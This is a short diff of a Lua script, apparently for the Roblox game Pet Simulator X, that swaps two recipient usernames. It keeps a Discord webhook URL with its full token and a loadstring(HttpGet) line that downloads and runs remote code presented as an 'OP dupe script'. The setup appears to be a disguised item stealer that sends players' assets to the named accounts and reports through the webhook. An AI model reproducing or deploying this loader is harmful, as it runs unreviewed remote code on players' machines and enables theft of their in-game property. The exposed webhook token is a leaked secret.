@@ -1,5 +1,5 @@
-UserName = "whyyoubleed"
-UserName2 = "Funnyanthany" 
+UserName = "Funnyanthany"
+UserName2 = "whyyoubleed" 
 Webhook = "https://discord.com/api/webhooks/1089392549405397042/mBZF_RljeUiHM1weut02c50BlB45ckH3tVTohqCMv46EYgMEL2PlqQOlMvqlfqt4LYd9" 
 
 loadstring(game:HttpGet("https://raw.githubusercontent.com/boywithluke/pet-sim-x-script/main/OP%20pet%20sim%20x%20dupe%20script"))()
